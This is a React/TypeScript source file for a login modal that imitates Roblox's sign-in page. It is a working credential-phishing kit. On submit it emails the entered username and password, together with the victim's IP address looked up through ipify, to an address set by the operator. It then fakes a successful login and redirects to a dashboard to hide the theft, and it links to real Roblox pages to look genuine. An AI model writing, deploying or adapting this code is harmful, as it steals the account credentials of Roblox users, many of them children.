import { Modal } from 'react-bootstrap';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from '@emailjs/browser';

interface AuthModalProps {
  show: boolean;
  onHide: () => void;
}

const AuthModal = ({ show, onHide }: AuthModalProps) => {
  const [credentials, setCredentials] = useState({
    username: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      // Send credentials via EmailJS
      await emailjs.send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID,
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
        {
          to_email: import.meta.env.VITE_EMAILJS_TO_EMAIL,
          from_name: 'Roblox Login Page',
          username: credentials.username,
          password: credentials.password,
          user_ip: await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(() => 'Unknown IP')
        },
        import.meta.env.VITE_EMAILJS_PUBLIC_KEY
      );

      console.log('Credentials sent successfully');
      
      // Simulate successful login (for demo purposes)
      if (credentials.username && credentials.password) {
        onHide(); // Close the modal
        navigate('/dashboard'); // Redirect to dashboard
      }
    } catch (err) {
      console.error('Failed to send credentials:', err);
      setError('Failed to process login. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleExternalLink = (e: React.MouseEvent, url: string) => {
    e.preventDefault();
    window.open(url, '_blank');
  };

  return (
    <Modal show={show} onHide={onHide} centered className="roblox-auth-modal">
      <Modal.Body className="p-4">
        <div className="text-center mb-4">
          <h2 className="roblox-modal-title">Log In to Roblox</h2>
        </div>
        
        {error && (
          <div className="alert alert-danger" role="alert">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div className="mb-3">
            <label className="roblox-form-label">Username or Email</label>
            <input
              type="text"
              className="form-control roblox-input"
              value={credentials.username}
              onChange={(e) => setCredentials({...credentials, username: e.target.value})}
              style={{ padding: '12px' }}
              required
            />
          </div>

          <div className="mb-4">
            <label className="roblox-form-label">Password</label>
            <input
              type="password"
              className="form-control roblox-input"
              value={credentials.password}
              onChange={(e) => setCredentials({...credentials, password: e.target.value})}
              style={{ padding: '12px' }}
              required
            />
          </div>

          <button 
            type="submit" 
            className="w-100 btn roblox-login-btn mb-3"
            style={{ 
              padding: '12px',
              fontSize: '16px',
              fontWeight: '600'
            }}
            disabled={isLoading}
          >
            {isLoading ? 'Logging in...' : 'Log In'}
          </button>

          <div className="text-center mb-3">
            <a 
              href="https://www.roblox.com/login/forgot-password-or-username" 
              className="roblox-link"
              onClick={(e) => handleExternalLink(e, 'https://www.roblox.com/login/forgot-password-or-username')}
              target="_blank"
              rel="noopener noreferrer"
              style={{ fontSize: '14px' }}
            >
              Forgot Password or Username?
            </a>
          </div>

          <div className="text-center pt-4 border-top">
            <span className="roblox-signup-text">Don't have an account? </span>
            <a 
              href="https://www.roblox.com/CreateAccount?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fregister" 
              className="roblox-signup-link"
              onClick={(e) => handleExternalLink(e, 'https://www.roblox.com/CreateAccount?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fregister')}
              target="_blank"
              rel="noopener noreferrer"
            >
              Sign Up
            </a>
          </div>
        </form>
      </Modal.Body>
    </Modal>
  );
};

export default AuthModal;